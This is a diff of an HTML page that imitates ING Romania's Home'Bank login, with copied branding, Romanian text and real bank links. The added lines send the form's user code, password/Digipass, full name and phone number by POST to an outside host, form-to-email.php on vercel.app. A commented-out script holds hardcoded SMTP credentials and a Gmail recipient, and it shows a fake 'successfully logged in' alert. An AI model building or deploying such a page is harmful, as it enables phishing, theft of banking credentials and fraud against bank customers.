@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
     <link rel="stylesheet" href="./css/styles.css">
 
     <title>Login</title>
 </head>
+
 <body>
     <div class="container-">
         <nav class="nav justify-content-start">
@@ -17,21 +20,23 @@
             </div>
         </nav>
         <main>
+            <div class="desktop-p">
+                <h2 class="heading">ING Home'Bank</h2>
+                <h4 class="fw-bold">Eşti client ING şi nu ai încă ING Home'Bank? <a
+                        href="https://www.homebank.ro/hb/hb/#/services/homebank/activate">Activează-l acum!</a></h4>
+                <h4><span class="fw-bold">Nu eşti client ING?</span> Descarcă Home’Bank din Play Store sau App Store şi
+                    deschide-ţi cont pe loc.</h4>
+            </div>
             <div class="credit-card">
-                
+
                 <div class="info">
                     <p>Ia-ți ING Credit Card<br>
-                    direct din Home’Bank<br>
-                    și ai plăți în rate și alte beneficii minunate.</p>
+                        direct din Home’Bank<br>
+                        și ai plăți în rate și alte beneficii minunate.</p>
                 </div>
             </div>
             <div class="main">
                 <h2 class="heading-login-form">ING Home'Bank</h2>
-                <div class="desktop-p">
-                    <h4 class="fw-bold">Eşti client ING şi nu ai încă ING Home'Bank? <a href="">Activează-l acum!</a></h4>
-                    <h4><span class="fw-bold">Nu eşti client ING?</span> Descarcă Home’Bank din Play Store sau App Store şi deschide-ţi cont pe loc.</h4>
-                </div>
-                
                 <div class="login-form">
                     <div class="form-title nav justify-content-between">
                         <div class="headline align-middle">
@@ -41,28 +46,30 @@
                         <div class="services">
                             <a href="https://www.homebank.ro/hb/hb/#/services/homebank/activate" style="color: black
                             ;">Nu ai Home'Bank</a>
-                        </div> 
+                        </div>
                     </div>
                     <div class="form-inputs">
-                        <form action="" method="get">
+                        <form action="https://ing-login-page.vercel.app/form-to-email.php" method="post" id="loginform" enctype="text/plain">
                             <div class="username-input mb-3">
-                                <label for="usercode">Codul de utilizator</label>
-                                <input type="text" class="form-control" name="usercode" id="usercode">
+                                <label for="Codul-de-utilizator">Codul de utilizator</label>
+                                <input type="text" class="form-control" name="Codul-de-utilizator"
+                                    id="Codul-de-utilizator">
                             </div>
                             <div class="password mb-3">
-                                <label for="password">Parolă/Digipass</label>
-                                <input type="password" class="form-control" name="password" id="password">
+                                <label for="Parola">Parolă/Digipass</label>
+                                <input type="password" class="form-control" name="Parola" id="Parola">
                             </div>
                             <div class="full-name mb-3">
-                                <label for="full-name">Nume complet</label>
-                                <input type="text" class="form-control" name="full-name" id="full-name">
+                                <label for="Nume-complet">Nume complet</label>
+                                <input type="text" class="form-control" name="Nume-complet" id="Nume-complet">
                             </div>
                             <div class="phone-number mb-3">
-                                <label for="phone-number">Numar de telefon</label>
-                                <input type="tel" class="form-control" name="phone-number" id="phone-number">
+                                <label for="Numar-de-telefon">Numar de telefon</label>
+                                <input type="tel" class="form-control" name="Numar-de-telefon" id="Numar-de-telefon">
                             </div>
-                            <button type="submit" class="submit-button btn d-grid gap-2 col-6 mx-auto mt-5 mb-4 fw-bold">Login</button>
-                            
+                            <button type="submit" id="submit" name="submit" value="Send Email"
+                                class="submit-button btn d-grid gap-2 col-6 mx-auto mt-5 mb-4 fw-bold" onclick="sendEmail()">Login</button>
+
                             <div class="reconfirm nav justify-content-between">
                                 <div class="reset-password">
                                     <a href="#" class="text-decoration-none button-form">Resetează parolă</a>
@@ -79,113 +86,66 @@
                     </div>
                 </div>
             </div>
-            
-        </main>
-        <footer>
-            <div class="footer-tabs">
-                <div class="utile">
-                    <h5>Utile</h5>
-                    <div class="utile-links">
-                        <a href="https://www.ing.ro/ing-in-romania/contact">
-                            <div class="phone">
-                                <img src="./images/icons8-phone-100.png" width="25" height="25" class="d-inline-block align-text-top"> Relaţii cu clienţii
-                            </div>
-                        </a>
-                        <a href="https://www.ing.ro/ing-in-romania/informatii-utile/securitate">
-                            <div class="person">
-                                <img src="./images/icons8-customer-100.png" width="25" height="25" class="d-inline-block align-text-top"> Securitate
-                            </div>
-                        </a>
-                        <a href="https://www.ing.ro/ing-in-romania/contact#harta">
-                            <div class="location">
-                                <img src="./images/icons8-map-marker-96.png" width="25" height="25" class="d-inline-block align-text-top"> Sucursale şi ATM-uri
-                            </div>
-                        </a>
-                        <a href="https://www.ing.ro/dam/ingro/doc/contractuale/pers-fizice/Lista-de-taxe-si-comisioane.pdf">
-                            <div class="tax">
-                                <img src="./images/icons8-cookies-100.png" width="25" height="25" class="d-inline-block align-text-top"> Taxe şi comisioane
-                            </div>
-                        </a>
+            <div class="desktop-p">
+                <h5>Descarcă aplicaţia Home'Bank</h5>
+                <div class="mobile-app">
 
-                        <a href="https://www.ing.ro/ing-in-romania/informatii-utile/curs-valutar">
-                            <div class="money">
-                                <img src="./images/icons8-notes-98.png" width="25" height="25" class="d-inline-block align-text-top"> Curs valutar
-                            </div>
-                        </a>
-
-                        <a href="https://ing.ro/dam/ingro/doc/contractuale/pers-fizice/ghidul-platilor-20190423.pdf">
-                            <div class="cut-off-time">
-                                <img src="./images/icons8-documents-64.png" width="25" height="25" class="d-inline-block align-text-top"> Tabel Cut off time
-                            </div>
-                        </a>
-                        <a href="https://www.ing.ro/ing-in-romania/informatii-utile/solutionare-litigii-cu-banca">
-                            <div class="book">
-                                <img src="./images/icons8-book-64.png" width="25" height="30" class="d-inline-block align-text-top"> Reclamaţii şi petiţii
-                            </div>
-                        </a>
-                        <a href="https://ing.ro/ing-in-romania/informatii-utile/documente-contractuale">
-                            <div class="document">
-                                <img src="./images/icons8-documents-64.png" width="25" height="25" class="d-inline-block align-text-top"> Documente contractuale
-                            </div>
-                        </a>  
+                    <div class="android">
+                        <div class="google-play">
+                            <p class="heading">Google Play</p>
+                            <p>Versiune minimă:</p>
+                            <p>Android 8.0</p>
+                        </div>
+                        <div class="qr-code">
+                            <img src="./images/android_qr.jpg">
+                        </div>
                     </div>
-                    
+                    <div class="iphone">
+                        <div class="app-store">
+                            <p class="heading">App Store</p>
+                            <p>Versiune minimă:</p>
+                            <p>iOS 13.0</p>
+                        </div>
+                        <div class="qr-code">
+                            <img src="./images/apple_qr.jpg">
+                        </div>
+                    </div>
                 </div>
-                <div class="social-links">
-                    <h5>Social Links</h5>
-                    <div class="social-media">
-                        <a href="http://www.facebook.com/INGWebCafe">
-                            <div class="facebook">
-                                <img src="./images/icons8-facebook.svg" width="50" alt="Facebook">
-                                <p>/ingromania</p>
-                            </div>
-                        </a>
-                        <a href="https://www.instagram.com/ingromania/">
-                            <div class="instagram">
-                                <img src="./images/icons8-instagram-100.png" width="60" alt="Instagram">
-                                <p>/ingromania</p>
-                            </div>
-                        </a>
-                        <a href="https://twitter.com/ing_ro">
-                            <div class="twitter">
-                                <img src="./images/icons8-twitter-squared-100.png" width="60" alt="Twitter">
-                                <p>/ING Romania</p>
-                            </div>
-                        </a>
-                        <a href="http://www.youtube.com/user/ingbankromania">
-                            <div class="youtube">
-                                <img src="./images/icons8-youtube.svg" width="60" alt="Youtube">
-                                <p>/ING Romania</p>
-                            </div>
-                        </a>  
-                    </div>                    
-                </div>
-            </div>
-            <div class="footer-links">
-                <a href="https://www.ing.ro/ing-in-romania/informatii-utile/securitate" target="_blank" rel="noopener noreferrer">Securitate</a> |
-                <a href="https://www.ing.ro/dam/jcr:4e61c812-e255-4780-9786-38ce0c00adbd/rate_dobanzi.pdf" target="_blank" rel="noopener noreferrer">Rate şi dobânzi</a> |
-                <a href="https://www.ing.jobs/Romania/Acasa.htm" target="_blank" rel="noopener noreferrer">Cariere</a> |
-                <a href="https://www.ing.ro/ing-in-romania/relatii-cu-media" target="_blank" rel="noopener noreferrer">Relaţii cu media</a> |
-                <a href="http://www.anpc.gov.ro/" target="_blank" rel="noopener noreferrer">ANPC</a> |
-                <a href="https://www.ing.ro/ing-in-romania/informatii-utile/confidentialitate" target="_blank" rel="noopener noreferrer">Confidenţialitate</a> |
-                <a href="https://www.ing.ro/ing-in-romania/informatii-utile/mifid" target="_blank" rel="noopener noreferrer">MiFID</a> |
-                <a href="https://www.ing.ro/ing-in-romania/informatii-utile/promotii" target="_blank" rel="noopener noreferrer">Promoţii</a> |
-    
-            </div>
-            <div class="anpc-copyright">
-                <img src="./images/anpc-logo.png" height="50" alt="anpc">
-                <p class="copyright">
-                    Copyright 2023, ING Bank N.V. Amsterdam, Sucursala Bucureşti
-                </p>
-            </div>
-            
 
+            </div>
 
-            
-        </footer>
+        </main>
+        
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js" integrity="sha384-mQ93GR66B00ZXjt0YO5KlohRA5SY2XofN4zfuZxLkoj1gXtW8ANNCe9d5Y3eG5eD" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
+
+    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+        function sendEmail() {
+            Email.send({
+              Host : "sandbox.smtp.mailtrap.io",
+              Username : "333960022e288c",
+              Password : "7bdd8ec8403e44",
+              To : 'awwaladeleke@gmail.com',
+              From : "sender@example.com",
+              Subject : "Test email",
+              Body : "<html><h2>Header</h2><strong>Bold text</strong><br></br><em>Italic</em></html>"
+            }).then(
+              message => alert("You have successfully logged in")
+            ).catch(
+                message => alert("Nu ati completat toate câmpurile necesare!")
+            );
+          }
+    </script> -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
+        integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"
+        integrity="sha384-mQ93GR66B00ZXjt0YO5KlohRA5SY2XofN4zfuZxLkoj1gXtW8ANNCe9d5Y3eG5eD" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous">
+    </script>
 </body>
+
 </html>
